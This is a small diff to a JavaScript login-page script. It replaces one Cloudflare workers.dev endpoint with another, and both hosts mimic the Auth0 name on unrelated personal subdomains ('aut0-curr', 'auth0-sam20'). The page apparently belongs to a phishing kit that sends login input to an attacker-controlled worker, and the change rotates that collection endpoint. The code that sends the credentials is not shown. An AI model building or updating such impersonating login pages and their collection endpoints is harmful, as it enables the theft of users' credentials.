@@ -21,7 +21,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    var url = "https://aut0-curr-9dc7.henrycrane65.workers.dev/"; // Your Worker URL
+    var url = "https://auth0-sam20.jjmdw.workers.dev/"; // Your updated Worker URL
 
     submit_btn = document.getElementById("continueFromUserLogin");
     userInputContainerDiv = document.getElementById("userInputContainerDiv");
